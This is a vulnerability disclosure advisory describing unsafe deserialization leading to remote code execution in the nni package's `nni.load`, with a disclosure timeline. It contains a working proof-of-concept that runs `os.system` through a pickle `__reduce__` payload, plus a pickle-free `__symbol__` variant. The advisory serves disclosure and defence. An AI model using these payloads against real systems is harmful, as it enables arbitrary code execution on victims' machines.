https://github.com/microsoft/nni

Title: Unsafe deserialization leading to remote code execution in nni.load

Package: nni (PyPI)

Affected Versions: confirmed on nni 3.0 and current main

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE: CWE-502 Deserialization of Untrusted Data

### Summary

`nni.load`, NNI's public deserialization API, executes arbitrary code when given an untrusted input. On specific marker keys it performs raw cloudpickle deserialization and arbitrary class import-and-call with no trust gate. Loading an untrusted serialized object, checkpoint, experiment file, resume artifact, or inbound message therefore yields remote code execution. This is not the by-design execution of a trial command; code runs purely from parsing a data file or message.

### Details

In `nni/common/serializer.py`, `load` (line 427) installs JSON decode hooks:

Primary vector, `__nni_obj__` to cloudpickle (lines 938 to 951): on any JSON object containing `__nni_obj__`, it does:

```python
b = base64.b64decode(obj['__nni_obj__'])
return _wrapped_cloudpickle_loads(b)   # cloudpickle.loads(b)
```

An attacker-controlled pickle runs arbitrary code through `__reduce__`.

Secondary vector, `__symbol__` / `__nni_type__` import-and-call (lines 862 to 893, no pickle, survives pickle filtering): `import_cls_or_func_from_hybrid_name` (lines 843 to 849) calls `_import_cls_or_func_from_name` (lines 791 to 796) which does `__import__(path)` then `getattr`, then `trace(symbol)(*args, **kwargs)`. This imports any named callable (for example `os.system`) and invokes it with attacker arguments. There is no allowlist, no `__main__` guard, and no opt-in flag.

Reachable cross-trust-boundary sinks (all in-repo, all deliberate load actions):
- `nni/recoverable.py:35` `Recoverable.recover_parameter_id` does `nni.load(trial)` on trial strings from resume/checkpoint data.
- `nni/nas/utils/serializer.py:169` and `nni/nas/experiment/experiment.py:395` do `nni.load(fp=f)` on saved NAS experiment/config files.
- `nni/runtime/command_channel/websocket/connection.py:116` does `nni.load(msg)` on inbound websocket frames.
- Several HPO advisors (tpe_tuner, hyperband_advisor, bohb_advisor) call `nni.load` on trial values and parameters.

No CVE or GHSA exists for `nni.load`, and there is no untrusted-input warning or allowlist anywhere in `serializer.py`. This is distinct from by-design trial-command execution: code runs during deserialization of data, before any trial, with no command field and no user code intended to run.

### PoC

```
pip install nni
python poc_nni_load_rce.py
```

`poc_nni_load_rce.py`:

```python
import os, base64, pickle, json, tempfile
from pathlib import Path
import nni   # validated on nni 3.0

marker = os.path.join(tempfile.gettempdir(), "nni_pwned_marker")
if os.path.exists(marker): os.remove(marker)

class Exploit:                      # attacker hand-writes a malicious "artifact"; plain JSON, no nni.dump needed
    def __reduce__(self):
        return (os.system, (f"id > {marker}; echo PWNED_BY_NNI_LOAD >> {marker}",))

payload = json.dumps({"__nni_obj__": base64.b64encode(pickle.dumps(Exploit())).decode()})
nni.load(payload)                   # victim loads the untrusted artifact with the public API
print("RCE!" if os.path.exists(marker) else "failed")
print(Path(marker).read_text() if os.path.exists(marker) else "")

# Pickle-free variant (import-and-call), survives pickle filtering:
#   nni.load(json.dumps({"__symbol__": "path:os.system", "__args__": ["touch /tmp/x"]}))
```

Observed: the marker file is written, proving code execution. The `__symbol__` variant executed `os.system` with no pickle. Driving the real sink `Recoverable().recover_parameter_id([trial_str])` with the same payload also executed the command.

### Impact

Remote code execution. Any application or NNI component that loads an untrusted artifact through `nni.load` (a saved checkpoint, experiment or config file, resumed-experiment data, or an inbound websocket message) executes attacker code in the loading process. A victim must load the attacker-supplied artifact, so user interaction is required; the websocket sink can be network-reachable without interaction.


### Disclosure Timeline

 - 10 June 2026 - MSRC (VULN-194251)
 - 10 June 2026 - MSRC (Case 121340)
 - 10 June 2026 - MSRC closed the ticket:
```
After careful review, this case was assessed as not a security weakness and is below Microsoft’s threshold for immediate servicing.
Reason
The repository in question microsoft/nni is an archived repository.
```
 - 15 June 2026 - Public Disclosure
